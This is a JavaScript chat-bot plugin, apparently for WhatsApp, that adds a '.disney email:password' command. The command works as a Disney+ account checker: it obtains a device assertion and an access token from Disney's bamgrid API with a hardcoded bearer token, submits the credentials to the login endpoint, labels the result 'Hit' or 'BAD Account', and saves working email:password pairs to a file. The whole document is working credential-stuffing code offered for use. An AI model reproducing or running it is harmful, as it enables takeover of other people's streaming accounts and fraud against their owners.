import axios from 'axios';
import fs from 'fs';
import path from 'path';

let handler = async (m, { conn, command, text, args, usedPrefix }) => {
  // Comando .Disney mail:pass
  if (command === 'disney') {
    const [email, password] = text.split(':');

    if (!email || !password) {
      return conn.reply(m.chat, 'Formato inválido. Usa el formato: `.Disney email:password`', m);
    }

    let hits = 0;
    let bad = 0;

    try {
      // Crear directorio donde guardar los resultados
      const dir = path.join(__dirname, '/sdcard/HJ_Disney');
      if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
      }

      // Configurar sesión y headers
      const session = axios.create();
      const headers = {
        'content-type': 'application/json',
        'authorization': 'Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      };

      // Hacer la primera petición para obtener el assertion
      const deviceData = JSON.stringify({ deviceFamily: "browser", applicationRuntime: "chrome", deviceProfile: "windows", attributes: {} });
      const deviceResponse = await session.post('https://global.edge.bamgrid.com/devices', { headers, data: deviceData });
      const assertion = deviceResponse.data.assertion;

      if (!assertion) {
        return conn.reply(m.chat, `Fallo al obtener assertion para ${email}`, m);
      }

      // Hacer la segunda petición para obtener el token de acceso
      const tokenData = `grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token=${assertion}&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Adevice`;
      const tokenResponse = await session.post('https://global.edge.bamgrid.com/token', { headers: { ...headers, 'content-type': 'application/x-www-form-urlencoded' }, data: tokenData });
      const accessToken = tokenResponse.data.access_token;

      if (!accessToken) {
        return conn.reply(m.chat, `Fallo al obtener el access token para ${email}`, m);
      }

      // Realizar login con las credenciales del usuario
      const loginHeaders = { ...headers, 'authorization': `Bearer ${accessToken}` };
      const loginData = JSON.stringify({ email, password });
      const loginResponse = await session.post('https://global.edge.bamgrid.com/idp/login', { headers: loginHeaders, data: loginData });

      // Verificar si el login fue exitoso
      if (loginResponse.data.includes('id_token')) {
        hits++;
        const successMessage = `Hit -> ${email}:${password} | By: @hjofc123`;
        console.log("\x1b[32m" + successMessage + "\x1b[0m");

        // Guardar el hit en el archivo
        fs.appendFileSync(path.join(__dirname, '/sdcard/HJ_Disney/Disney.txt'), `${email}:${password}\n${successMessage}\n`);
        conn.reply(m.chat, successMessage, m);
      } else {
        bad++;
        console.log("\x1b[31mBAD Account >>", email, "\x1b[0m");
        conn.reply(m.chat, `BAD Account >> ${email}`, m);
      }
    } catch (error) {
      console.error('Error:', error);
      bad++;
      conn.reply(m.chat, `Error al verificar las credenciales para ${email}. Intenta nuevamente más tarde.`, m);
    }

    // Resumen final
    conn.reply(m.chat, `\nResumen final:\nHits ✅: ${hits}\nBad ❌: ${bad}\n`, m);
  }
};

// Establecer el comando
handler.command = ['disney'];

export default handler;
